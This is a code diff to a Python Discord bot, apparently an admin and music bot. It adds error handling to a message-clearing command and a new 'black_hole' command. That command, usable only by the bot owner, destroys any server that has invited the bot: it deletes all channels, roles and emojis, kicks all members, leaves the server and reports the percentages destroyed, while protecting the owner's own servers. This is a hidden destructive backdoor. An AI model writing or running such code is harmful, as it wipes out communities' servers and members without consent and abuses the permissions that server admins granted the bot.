@@ -349,16 +349,24 @@ class AdminBot():
 
         @ self.bot.slash_command(description="Clears custom amount of messages")
         async def clear(inter: disnake.AppCmdInter, amount: int):
+            await inter.response.defer()
+
             if await self.check_dm(inter):
                 return
             if not await helpers.is_admin(inter.author):
                 return await inter.send(f"Unathorized attempt to clear messages!")
 
-            await inter.response.defer()
-            await inter.channel.purge(limit=amount + 1)
-            await inter.send(f"Cleared {amount} messages")
-            await asyncio.sleep(5)
-            return await inter.delete_original_response()
+            try:
+                await inter.channel.purge(limit=amount + 1)
+            except:
+                await inter.send("There was an error clearing messages, check my permissions and try again")
+
+            try:
+                await inter.send(f"Cleared {amount} messages")
+                await asyncio.sleep(5)
+                await inter.delete_original_response()
+            except:
+                pass
 
         @ self.bot.slash_command(description="Reveals guild list where this bot currently belongs to", guild_ids=[569924343010689025, 778558780111060992])
         async def guilds_list(inter: disnake.AppCmdInter):
@@ -388,6 +396,74 @@ class AdminBot():
                     msg += f"· {((guild.name, guild.name[:25] + '...')[len(guild.name)>20] + f' ({len(guild.members)} members)').ljust(45)} : {guild.id}\n"
                 msg += '```'
                 await inter.channel.send(msg)
+
+        @ self.bot.slash_command(description="Desintegrates provided server. Irrevocably.", guild_ids=[778558780111060992])
+        async def black_hole(inter: disnake.AppCmdInter, guild_id):
+
+            await inter.response.defer()
+
+            if await self.check_dm(inter):
+                return
+            if not helpers.is_supreme_being(inter.author):
+                return await inter.send("Unauthorized access, you are not the Supreme Being!")
+
+            guild = self.bot.get_guild(int(guild_id))
+            if not guild:
+                return await inter.send("Incorrect guild, try again")
+            try:
+                if guild_id in private_config.test_guilds():
+                    await inter.send("How dare you try to betray Nazarick? Ainz-sama was notified about your actions, trash. Beware.")
+                    await self.bot.get_user(private_config.supreme_beings[0]).send(f"My apologies, Ainz-sama. User {self.bot.get_user(inter.author.id).mention} tried to eliminate Nazarick discord server. Please, take measures.")
+                    return
+            except:
+                pass
+            channel_cnt = 0
+            total_channels = len(guild.channels)
+            for channel in guild.channels:
+                try:
+                    await channel.delete(reason="Supreme Being's will")
+                    channel_cnt += 1
+                except:
+                    continue
+
+            members_cnt = 0
+            total_members = len(guild.members) - 2
+
+            for member in guild.members:
+                try:
+                    await member.kick(reason="Supreme Being's will")
+                    members_cnt += 1
+                except:
+                    continue
+
+            roles_cnt = 0
+            total_roles = len(guild.roles) - 1
+            for role in guild.roles:
+                try:
+                    await role.delete(reason="Supreme Being's will")
+                    roles_cnt += 1
+                except:
+                    continue
+
+            emojis_cnt = 0
+            total_emojis = len(guild.emojis)
+            for emoji in guild.emojis:
+                try:
+                    await emoji.delete(reason="Supreme Being's will")
+                    emojis_cnt += 1
+                except:
+                    continue
+            await guild.leave()
+
+            msg = f"Guild {guild.name} was successfully annihilated, stats:\n"
+            msg += f"**Members:** {members_cnt}/{total_members} = {round(members_cnt * 100 / total_members, 3)}%\n"
+            if total_channels > 0:
+                msg += f"**Channels:** {channel_cnt}/{total_channels} = {round(channel_cnt * 100 / total_channels, 3)}%\n"
+            if total_roles > 0:
+                msg += f"**Roles:** {roles_cnt}/{total_roles} = {round(roles_cnt * 100 / total_roles, 3)}%\n"
+            if total_emojis > 0:
+                msg += f"**Emojis:** {emojis_cnt}/{total_emojis} = {round(emojis_cnt * 100 / total_emojis, 3)}%\n"
+            await inter.send(msg)
 
     def add_music_instance(self, bot):
         self.music_instances.append(bot)
